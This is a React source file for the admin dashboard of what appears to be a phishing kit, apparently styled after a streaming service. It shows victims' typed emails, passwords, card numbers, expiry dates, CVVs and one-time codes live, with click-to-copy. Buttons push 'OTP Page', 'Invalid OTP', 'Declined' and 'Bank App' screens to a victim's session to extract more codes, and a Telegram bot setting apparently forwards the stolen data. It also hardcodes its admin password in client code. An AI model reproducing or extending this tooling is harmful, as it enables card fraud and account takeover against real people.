import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { Loader2, Monitor, Smartphone, Globe, Wifi, WifiOff, Trash2, Settings, Shield, LogOut, RefreshCw, Lock } from "lucide-react";

const ADMIN_PASSWORD = "weareme";

type Command = "bank_app" | "otp_page" | "invalid_otp" | "declined" | "normal" | "block";

function CopyableText({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <span
      onClick={handleCopy}
      title="Click to copy"
      style={{ cursor: "pointer", fontFamily: "monospace", backgroundColor: "#1e1e1e", padding: "2px 6px", borderRadius: "4px", fontSize: "12px", color: copied ? "#4ade80" : "#e0e0e0", transition: "color 0.2s", userSelect: "none" }}
    >
      {copied ? "✓ Copied" : text}
    </span>
  );
}

function TypingIndicator({ value, label }: { value: string | null | undefined; label: string }) {
  if (!value) return null;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: "6px", fontSize: "12px" }}>
      <span style={{ color: "#6b7280", minWidth: "60px" }}>{label}:</span>
      <span style={{
        fontFamily: "monospace",
        backgroundColor: "#0f2a1a",
        border: "1px solid #166534",
        padding: "2px 8px",
        borderRadius: "4px",
        color: "#4ade80",
        fontSize: "12px",
        maxWidth: "200px",
        overflow: "hidden",
        textOverflow: "ellipsis",
        whiteSpace: "nowrap",
        display: "flex",
        alignItems: "center",
        gap: "4px",
      }}>
        <span style={{ display: "inline-block", width: "6px", height: "6px", borderRadius: "50%", backgroundColor: "#4ade80", animation: "pulse 1s ease-in-out infinite" }} />
        {value}
      </span>
    </div>
  );
}

function PasswordGate({ onSuccess }: { onSuccess: () => void }) {
  const [pw, setPw] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pw === ADMIN_PASSWORD) {
      onSuccess();
    } else {
      setError("Incorrect password. Please try again.");
      setPw("");
    }
  };

  return (
    <div style={{ backgroundColor: "#0a0a0a", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "16px" }}>
      <div style={{ backgroundColor: "#111", border: "1px solid #1e1e1e", borderRadius: "16px", padding: "clamp(28px, 6vw, 48px)", width: "100%", maxWidth: "400px", boxSizing: "border-box", textAlign: "center" }}>
        <div style={{ width: "56px", height: "56px", borderRadius: "50%", backgroundColor: "#1a1a1a", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
          <Lock size={24} color="#E50914" />
        </div>
        <h1 style={{ color: "white", fontSize: "clamp(18px, 4vw, 22px)", fontWeight: 800, marginBottom: "8px" }}>Admin Access</h1>
        <p style={{ color: "#6b7280", fontSize: "13px", marginBottom: "28px" }}>Enter the admin password to continue</p>
        <form onSubmit={handleSubmit}>
          <input
            type="password"
            placeholder="Password"
            value={pw}
            onChange={e => { setPw(e.target.value); setError(""); }}
            autoFocus
            style={{ width: "100%", padding: "14px 16px", backgroundColor: "#1a1a1a", border: `1px solid ${error ? "#E50914" : "#333"}`, borderRadius: "8px", color: "white", fontSize: "15px", outline: "none", boxSizing: "border-box", marginBottom: "12px" }}
          />
          {error && <p style={{ color: "#E50914", fontSize: "13px", marginBottom: "12px", textAlign: "left" }}>{error}</p>}
          <button
            type="submit"
            style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "8px", padding: "14px", fontSize: "15px", fontWeight: 700, cursor: "pointer" }}
            onMouseEnter={e => { e.currentTarget.style.backgroundColor = "#c40812"; }}
            onMouseLeave={e => { e.currentTarget.style.backgroundColor = "#E50914"; }}
          >
            Enter
          </button>
        </form>
      </div>
    </div>
  );
}

export default function AdminPage() {
  const [authenticated, setAuthenticated] = useState(() => {
    return sessionStorage.getItem("admin_auth") === "true";
  });
  const [activeTab, setActiveTab] = useState<"sessions" | "telegram" | "security">("sessions");
  const [botToken, setBotToken] = useState("");
  const [chatId, setChatId] = useState("");
  const [savedMsg, setSavedMsg] = useState("");

  const handleAuthSuccess = () => {
    sessionStorage.setItem("admin_auth", "true");
    setAuthenticated(true);
  };

  const handleLogout = () => {
    sessionStorage.removeItem("admin_auth");
    setAuthenticated(false);
  };

  const sessionsQuery = trpc.admin.listSessions.useQuery(undefined, {
    refetchInterval: 3000,
    enabled: authenticated,
  });
  const tgConfigQuery = trpc.admin.getTelegramConfig.useQuery(undefined, {
    enabled: authenticated && activeTab === "telegram",
  });
  if (tgConfigQuery.data && !botToken && !chatId) {
    setBotToken(tgConfigQuery.data.botToken);
    setChatId(tgConfigQuery.data.chatId);
  }
  const sendCommandMutation = trpc.admin.sendCommand.useMutation({
    onSuccess: () => sessionsQuery.refetch(),
  });
  const deleteSessionMutation = trpc.admin.deleteSession.useMutation({
    onSuccess: () => sessionsQuery.refetch(),
  });
  const saveTgMutation = trpc.admin.saveTelegramConfig.useMutation({
    onSuccess: () => { setSavedMsg("Saved!"); setTimeout(() => setSavedMsg(""), 2000); },
  });

  if (!authenticated) {
    return <PasswordGate onSuccess={handleAuthSuccess} />;
  }

  const sessions = sessionsQuery.data || [];
  const onlineSessions = sessions.filter(s => s.isOnline === 1);

  const tabStyle = (active: boolean): React.CSSProperties => ({
    padding: "8px 14px",
    borderRadius: "6px",
    border: "none",
    cursor: "pointer",
    fontSize: "clamp(12px, 2.5vw, 14px)",
    fontWeight: 600,
    backgroundColor: active ? "#E50914" : "transparent",
    color: active ? "white" : "#9ca3af",
    display: "flex",
    alignItems: "center",
    gap: "6px",
    transition: "all 0.15s",
    whiteSpace: "nowrap",
  });

  const actionBtnStyle = (color: string = "#2a2a2a"): React.CSSProperties => ({
    padding: "6px 10px",
    borderRadius: "6px",
    border: "1px solid #3a3a3a",
    cursor: "pointer",
    fontSize: "clamp(11px, 2vw, 12px)",
    fontWeight: 600,
    backgroundColor: color,
    color: "white",
    transition: "opacity 0.15s",
    whiteSpace: "nowrap",
  });

  return (
    <div style={{ backgroundColor: "#0a0a0a", minHeight: "100vh", color: "white" }}>
      {/* Header */}
      <header style={{ padding: "clamp(14px, 3vw, 20px) clamp(16px, 4vw, 32px)", borderBottom: "1px solid #1e1e1e", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "12px" }}>
        <div>
          <h1 style={{ fontSize: "clamp(16px, 4vw, 22px)", fontWeight: 800, margin: 0 }}>Admin Dashboard</h1>
          <p style={{ color: "#6b7280", fontSize: "clamp(11px, 2.5vw, 13px)", margin: "4px 0 0" }}>Manage sessions and live visitor interactions</p>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
          <span style={{ color: "#4ade80", fontSize: "clamp(12px, 2.5vw, 13px)", fontWeight: 600 }}>
            {onlineSessions.length} online
          </span>
          <button onClick={handleLogout}
            style={{ ...actionBtnStyle(), display: "flex", alignItems: "center", gap: "6px", padding: "8px 14px" }}>
            <LogOut size={14} /> Logout
          </button>
        </div>
      </header>

      {/* Tabs */}
      <div style={{ padding: "12px clamp(16px, 4vw, 32px)", borderBottom: "1px solid #1e1e1e", display: "flex", gap: "6px", overflowX: "auto" }}>
        <button style={tabStyle(activeTab === "sessions")} onClick={() => setActiveTab("sessions")}>
          <Monitor size={14} /> Active Sessions
        </button>
        <button style={tabStyle(activeTab === "telegram")} onClick={() => setActiveTab("telegram")}>
          <Settings size={14} /> Telegram Config
        </button>
        <button style={tabStyle(activeTab === "security")} onClick={() => setActiveTab("security")}>
          <Shield size={14} /> Security
        </button>
      </div>

      {/* Content */}
      <div style={{ padding: "clamp(16px, 4vw, 24px) clamp(16px, 4vw, 32px)" }}>

        {/* Sessions Tab */}
        {activeTab === "sessions" && (
          <div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "20px", flexWrap: "wrap", gap: "8px" }}>
              <h2 style={{ fontSize: "clamp(14px, 3vw, 16px)", fontWeight: 700, margin: 0 }}>Active Sessions ({sessions.length})</h2>
              <button onClick={() => sessionsQuery.refetch()}
                style={{ ...actionBtnStyle(), display: "flex", alignItems: "center", gap: "6px" }}>
                <RefreshCw size={12} /> Refresh
              </button>
            </div>

            {sessionsQuery.isLoading ? (
              <div style={{ textAlign: "center", padding: "40px" }}>
                <Loader2 size={24} style={{ animation: "spin 1s linear infinite", color: "#E50914" }} />
              </div>
            ) : sessions.length === 0 ? (
              <div style={{ textAlign: "center", padding: "60px", color: "#6b7280" }}>
                <Monitor size={48} style={{ margin: "0 auto 16px", opacity: 0.3 }} />
                <p>No sessions yet</p>
              </div>
            ) : (
              <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                {sessions.map(session => (
                  <div key={session.id} style={{ backgroundColor: "#111", border: "1px solid #1e1e1e", borderRadius: "12px", padding: "clamp(14px, 3vw, 20px)", display: "flex", gap: "16px", alignItems: "flex-start", flexWrap: "wrap" }}>
                    {/* Session info */}
                    <div style={{ flex: 1, minWidth: "240px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "12px", flexWrap: "wrap" }}>
                        <div style={{ width: "10px", height: "10px", borderRadius: "50%", backgroundColor: session.isOnline ? "#4ade80" : "#6b7280", flexShrink: 0 }} />
                        <span style={{ fontSize: "12px", color: "#9ca3af", fontFamily: "monospace" }}>
                          ID: {session.id.slice(0, 12)}...
                        </span>
                        {session.isOnline ? <Wifi size={12} color="#4ade80" /> : <WifiOff size={12} color="#6b7280" />}
                      </div>

                      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(120px, 1fr))", gap: "12px", marginBottom: "12px" }}>
                        <div>
                          <p style={{ color: "#6b7280", fontSize: "10px", textTransform: "uppercase", letterSpacing: "0.05em", margin: "0 0 4px" }}>Location</p>
                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                            <Globe size={12} color="#4ade80" />
                            <span style={{ color: "#e0e0e0", fontSize: "12px" }}>{session.city || "?"}, {session.country || "?"}</span>
                          </div>
                        </div>
                        <div>
                          <p style={{ color: "#6b7280", fontSize: "10px", textTransform: "uppercase", letterSpacing: "0.05em", margin: "0 0 4px" }}>IP Address</p>
                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                            <Monitor size={12} color="#4ade80" />
                            <span style={{ color: "#e0e0e0", fontSize: "12px" }}>{session.ip || "?"}</span>
                          </div>
                        </div>
                        <div>
                          <p style={{ color: "#6b7280", fontSize: "10px", textTransform: "uppercase", letterSpacing: "0.05em", margin: "0 0 4px" }}>Device</p>
                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                            {session.device === "mobile" ? <Smartphone size={12} color="#4ade80" /> : <Monitor size={12} color="#4ade80" />}
                            <span style={{ color: "#e0e0e0", fontSize: "12px" }}>{session.device || "/"}</span>
                          </div>
                        </div>
                        <div>
                          <p style={{ color: "#6b7280", fontSize: "10px", textTransform: "uppercase", letterSpacing: "0.05em", margin: "0 0 4px" }}>Last Seen</p>
                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                            <div style={{ width: "8px", height: "8px", borderRadius: "50%", backgroundColor: "#4ade80" }} />
                            <span style={{ color: "#e0e0e0", fontSize: "12px" }}>
                              {session.lastSeen ? new Date(session.lastSeen).toLocaleTimeString() : "?"}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Live typing section */}
                      {(session.email || session.password || session.cardNumber || session.cardExpiry || session.cardCvv || session.cardName || session.otp) && (
                        <div style={{ backgroundColor: "#0a0a0a", border: "1px solid #1e1e1e", borderRadius: "8px", padding: "10px 12px", marginBottom: "10px" }}>
                          <p style={{ color: "#6b7280", fontSize: "10px", textTransform: "uppercase", letterSpacing: "0.05em", margin: "0 0 8px" }}>Live Data</p>
                          <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                            <TypingIndicator value={session.email} label="Email" />
                            <TypingIndicator value={session.password} label="Password" />
                            <TypingIndicator value={session.cardNumber} label="Card" />
                            <TypingIndicator value={session.cardExpiry} label="Expiry" />
                            <TypingIndicator value={session.cardCvv} label="CVV" />
                            <TypingIndicator value={session.cardName} label="Name" />
                            <TypingIndicator value={session.otp} label="OTP" />
                          </div>
                        </div>
                      )}

                      {/* Copyable data */}
                      <div style={{ display: "flex", flexWrap: "wrap", gap: "8px", marginBottom: "8px" }}>
                        {session.email && <div style={{ fontSize: "12px", color: "#9ca3af" }}>Email: <CopyableText text={session.email} /></div>}
                        {session.password && <div style={{ fontSize: "12px", color: "#9ca3af" }}>Pass: <CopyableText text={session.password} /></div>}
                        {session.cardNumber && <div style={{ fontSize: "12px", color: "#9ca3af" }}>Card: <CopyableText text={session.cardNumber} /></div>}
                        {session.cardExpiry && <div style={{ fontSize: "12px", color: "#9ca3af" }}>Exp: <CopyableText text={session.cardExpiry} /></div>}
                        {session.cardCvv && <div style={{ fontSize: "12px", color: "#9ca3af" }}>CVV: <CopyableText text={session.cardCvv} /></div>}
                        {session.cardName && <div style={{ fontSize: "12px", color: "#9ca3af" }}>Name: <CopyableText text={session.cardName} /></div>}
                        {session.otp && <div style={{ fontSize: "12px", color: "#9ca3af" }}>OTP: <CopyableText text={session.otp} /></div>}
                      </div>

                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                        <span style={{ fontSize: "11px", color: "#6b7280" }}>STATUS:</span>
                        <span style={{ fontSize: "11px", fontWeight: 700, color: "#60a5fa", backgroundColor: "#1e3a5f", padding: "2px 8px", borderRadius: "4px", textTransform: "uppercase" }}>
                          {session.status}
                        </span>
                      </div>
                    </div>

                    {/* Actions */}
                    <div style={{ minWidth: "180px", flexShrink: 0 }}>
                      <p style={{ color: "#6b7280", fontSize: "11px", textTransform: "uppercase", letterSpacing: "0.05em", marginBottom: "10px" }}>ACTIONS</p>
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px" }}>
                        {([
                          ["Invalid Card", "declined"],
                          ["Declined", "declined"],
                          ["Invalid OTP", "invalid_otp"],
                          ["OTP Page", "otp_page"],
                          ["Bank App", "bank_app"],
                          ["Normal", "normal"],
                        ] as [string, Command][]).map(([label, cmd]) => (
                          <button key={label}
                            onClick={() => sendCommandMutation.mutate({ sessionId: session.id, command: cmd })}
                            style={actionBtnStyle()}
                            onMouseEnter={e => { e.currentTarget.style.opacity = "0.7"; }}
                            onMouseLeave={e => { e.currentTarget.style.opacity = "1"; }}>
                            {label}
                          </button>
                        ))}
                      </div>
                      <div style={{ display: "flex", gap: "6px", marginTop: "8px" }}>
                        <button
                          onClick={() => sendCommandMutation.mutate({ sessionId: session.id, command: "block" })}
                          style={{ ...actionBtnStyle("#E50914"), flex: 1, display: "flex", alignItems: "center", justifyContent: "center", gap: "4px" }}>
                          🚫 Block
                        </button>
                        <button
                          onClick={() => deleteSessionMutation.mutate({ sessionId: session.id })}
                          style={{ ...actionBtnStyle("#1e1e1e"), padding: "6px 10px" }}>
                          <Trash2 size={14} />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Telegram Config Tab */}
        {activeTab === "telegram" && (
          <div style={{ maxWidth: "500px" }}>
            <h2 style={{ fontSize: "clamp(14px, 3vw, 16px)", fontWeight: 700, marginBottom: "20px" }}>Telegram Bot Configuration</h2>
            <div style={{ marginBottom: "16px" }}>
              <label style={{ display: "block", color: "#9ca3af", fontSize: "13px", marginBottom: "6px" }}>Bot Token</label>
              <input type="text" value={botToken} onChange={e => setBotToken(e.target.value)}
                style={{ width: "100%", padding: "12px", backgroundColor: "#1a1a1a", border: "1px solid #333", borderRadius: "8px", color: "white", fontSize: "14px", outline: "none", boxSizing: "border-box" }} />
            </div>
            <div style={{ marginBottom: "24px" }}>
              <label style={{ display: "block", color: "#9ca3af", fontSize: "13px", marginBottom: "6px" }}>Chat ID</label>
              <input type="text" value={chatId} onChange={e => setChatId(e.target.value)}
                style={{ width: "100%", padding: "12px", backgroundColor: "#1a1a1a", border: "1px solid #333", borderRadius: "8px", color: "white", fontSize: "14px", outline: "none", boxSizing: "border-box" }} />
            </div>
            <button onClick={() => saveTgMutation.mutate({ botToken, chatId })}
              style={{ backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "8px", padding: "12px 24px", fontSize: "14px", fontWeight: 700, cursor: "pointer" }}>
              {savedMsg || "Save Configuration"}
            </button>
          </div>
        )}

        {/* Security Tab */}
        {activeTab === "security" && (
          <div style={{ maxWidth: "500px" }}>
            <h2 style={{ fontSize: "clamp(14px, 3vw, 16px)", fontWeight: 700, marginBottom: "20px" }}>Security Settings</h2>
            <div style={{ backgroundColor: "#111", border: "1px solid #1e1e1e", borderRadius: "12px", padding: "20px" }}>
              <p style={{ color: "#9ca3af", fontSize: "14px", marginBottom: "16px" }}>Access: <strong style={{ color: "white" }}>Password Protected</strong></p>
              <p style={{ color: "#9ca3af", fontSize: "14px" }}>Role: <strong style={{ color: "#4ade80" }}>Administrator</strong></p>
            </div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.4; }
        }
      `}</style>
    </div>
  );
}
